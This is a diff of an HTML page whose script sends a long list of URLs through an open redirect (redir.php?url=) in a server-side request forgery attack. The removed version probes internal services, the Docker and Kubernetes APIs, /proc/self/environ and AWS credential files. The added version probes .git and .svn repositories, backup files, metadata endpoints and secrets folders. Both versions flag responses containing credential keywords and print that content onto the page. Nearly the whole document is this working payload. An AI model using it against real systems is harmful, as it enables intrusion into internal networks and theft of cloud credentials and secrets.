@@ -1,90 +1,115 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Internal Environment Discovery</title>
+    <title>Version & Git History Discovery</title>
 </head>
 <body>
-    <h1>🔍 Internal Environment & Process Discovery</h1>
+    <h1>📚 Version History & Git Repository Discovery</h1>
     <div id="results"></div>
     
     <script>
         var results = "";
         
-        // Look for environment variables and internal services
-        var envTests = [
-            // Environment variable endpoints
-            'http://httpbin.org/anything/env',  // Might reflect server env vars
+        // Look for version control and history information
+        var versionTests = [
+            // Git repository discovery
+            'http://localhost/.git/',
+            'http://localhost/.git/config',
+            'http://localhost/.git/HEAD',
+            'http://localhost/.git/logs/HEAD',
+            'http://localhost/.git/refs/heads/master',
+            'http://localhost/.git/refs/heads/main',
+            'http://localhost/.git/objects/',
+            'http://localhost/.git/index',
+            'http://localhost/.gitignore',
             
-            // PHP specific info gathering
-            'http://localhost/?phpinfo',
-            'http://localhost/index.php?info',
-            'http://localhost/test.php?phpinfo',
+            // SVN
+            'http://localhost/.svn/',
+            'http://localhost/.svn/entries',
             
-            // Common internal ports and services
-            'http://localhost:9000/',  // Often used for internal services
-            'http://localhost:9001/',
-            'http://localhost:6379/',  // Redis
-            'http://localhost:3306/',  // MySQL
-            'http://localhost:5432/',  // PostgreSQL
-            'http://localhost:11211/', // Memcached
-            'http://localhost:8080/manager/', // Tomcat
-            'http://localhost:8080/status/',
+            // Other version control
+            'http://localhost/.hg/',
+            'http://localhost/.bzr/',
             
-            // Docker/container specific
-            'http://localhost:2375/', // Docker API
-            'http://localhost:2376/', // Docker API SSL
-            'http://unix:/var/run/docker.sock/', // Docker socket
+            // Version/changelog files
+            'http://localhost/CHANGELOG',
+            'http://localhost/CHANGELOG.md',
+            'http://localhost/VERSION',
+            'http://localhost/version.txt',
+            'http://localhost/release-notes.txt',
+            'http://localhost/HISTORY',
+            'http://localhost/HISTORY.md',
             
-            // Kubernetes
-            'http://kubernetes.default.svc.cluster.local/',
-            'http://kubernetes.default.svc.cluster.local/api/',
+            // Backup and old versions
+            'http://localhost/index.php.bak',
+            'http://localhost/index.php.old',
+            'http://localhost/redir.php.bak',
+            'http://localhost/redir.php.old',
+            'http://localhost/config.php.bak',
+            'http://localhost/config.php.old',
+            'http://localhost/backup/',
+            'http://localhost/old/',
+            'http://localhost/archive/',
+            'http://localhost/v1/',
+            'http://localhost/v2/',
+            'http://localhost/legacy/',
             
-            // Local credential files
-            'http://localhost/wp-config.php',
-            'http://localhost/config/database.yml',
-            'http://localhost/config/app.yml',
-            'http://localhost/.aws/config',
-            'http://localhost/.aws/credentials',
+            // Development/debug info
+            'http://localhost/composer.lock',
+            'http://localhost/package-lock.json',
+            'http://localhost/yarn.lock',
+            'http://localhost/Gemfile.lock',
+            'http://localhost/requirements.txt',
+            'http://localhost/Pipfile',
             
-            // Process/system info
-            'http://localhost/proc/version',
-            'http://localhost/proc/cpuinfo',
-            'http://localhost/proc/meminfo',
-            'http://localhost/proc/net/arp',
-            'http://localhost/proc/self/environ',
+            // Application specific
+            'http://localhost/app.yaml',
+            'http://localhost/docker-compose.yml',
+            'http://localhost/Dockerfile',
+            'http://localhost/manifest.json',
+            'http://localhost/metadata.xml',
             
-            // Check for backup/old files
-            'http://localhost/backup.sql',
-            'http://localhost/database.sql',
-            'http://localhost/dump.sql',
-            'http://localhost/config.bak',
-            'http://localhost/config.old',
-            'http://localhost/aws-credentials.bak',
-            'http://localhost/credentials.txt'
+            // Check for old metadata service endpoints that might still work
+            'http://localhost/meta-data/',
+            'http://localhost/metadata/',
+            'http://localhost/instance/',
+            'http://localhost/instance-data/',
+            'http://localhost/cloud-init/',
+            'http://localhost/user-data/',
+            
+            // Legacy AWS credentials locations
+            'http://localhost/aws/',
+            'http://localhost/.boto',
+            'http://localhost/credentials/',
+            'http://localhost/keys/',
+            'http://localhost/secrets/'
         ];
         
-        for(var i = 0; i < envTests.length; i++) {
+        for(var i = 0; i < versionTests.length; i++) {
             try {
-                results += "<h4>🔍 " + envTests[i] + "</h4>";
+                results += "<h4>📁 " + versionTests[i] + "</h4>";
                 var xhr = new XMLHttpRequest();
-                xhr.open('GET', 'http://localhost/redir.php?url=' + envTests[i], false);
+                xhr.open('GET', 'http://localhost/redir.php?url=' + versionTests[i], false);
                 xhr.send();
                 
                 if(xhr.responseText && xhr.responseText.trim().length > 3) {
-                    results += "<div style='background:#e8f5e8;padding:8px;border:1px solid green;'>🎯 DISCOVERY: " + xhr.responseText.length + " bytes</div>";
+                    results += "<div style='background:#e8f5e8;padding:8px;border:1px solid green;'>📋 FOUND: " + xhr.responseText.length + " bytes</div>";
                     
-                    // Look for AWS-related keywords
+                    // Look for sensitive information
                     var text = xhr.responseText.toLowerCase();
-                    if(text.includes('aws') || text.includes('s3') || text.includes('access') || text.includes('secret') || text.includes('key')) {
-                        results += "<div style='background:#ffff00;padding:5px;border:2px solid red;'>🚨 CONTAINS AWS/CREDENTIAL KEYWORDS! 🚨</div>";
+                    if(text.includes('aws') || text.includes('secret') || text.includes('key') || text.includes('token') || text.includes('credential')) {
+                        results += "<div style='background:#ff6b6b;color:white;padding:5px;border:2px solid red;'>🔥 SENSITIVE CONTENT DETECTED! 🔥</div>";
+                    }
+                    if(text.includes('version') || text.includes('changelog') || text.includes('history')) {
+                        results += "<div style='background:#74c0fc;padding:5px;'>📖 VERSION INFO FOUND</div>";
                     }
                     
-                    results += "<div style='background:#f0f0f0;padding:8px;font-size:10px;max-height:120px;overflow:scroll;white-space:pre-wrap;'>" + xhr.responseText.substring(0, 1000) + "</div>";
+                    results += "<div style='background:#f0f0f0;padding:8px;font-size:10px;max-height:150px;overflow:scroll;white-space:pre-wrap;'>" + xhr.responseText.substring(0, 1000) + "</div>";
                 } else {
-                    results += "<div style='background:#ffe8e8;padding:2px;'>❌ No data</div>";
+                    results += "<div style='background:#ffe8e8;padding:2px;'>❌ Empty</div>";
                 }
             } catch(e) {
-                results += "<div style='background:#ffe8e8;padding:2px;'>❌ " + e.message.substring(0, 50) + "</div>";
+                results += "<div style='background:#ffe8e8;padding:2px;'>❌ Failed</div>";
             }
         }
         
